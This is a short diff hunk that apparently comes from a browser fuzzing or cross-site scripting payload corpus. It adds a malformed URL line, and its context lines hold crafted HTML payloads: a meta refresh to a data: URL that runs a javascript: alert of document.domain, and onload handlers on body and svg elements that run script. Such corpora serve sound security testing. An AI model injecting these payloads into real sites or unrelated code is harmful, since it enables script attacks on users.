@@ -1,3 +1,4 @@
+http://./\<#0>:  ://./<#0>
 <meta http-equiv=refresh content="0;url=data:,<script>parent.location.replace('javascript:alert(document.domain)')</script>">
 <meta http-equiv="X-UA-Co" content=x=EmulateIE10><canvas id=x><body onload=x.getContext("2d").fillText(x,0,0,.0001)>
 <meta http-equiv="X-UA-Compa"content="x=edge"><svg onload=document.styleSheets[0].addRule("x",0);><switch/><style>*:after{content:counter(x)
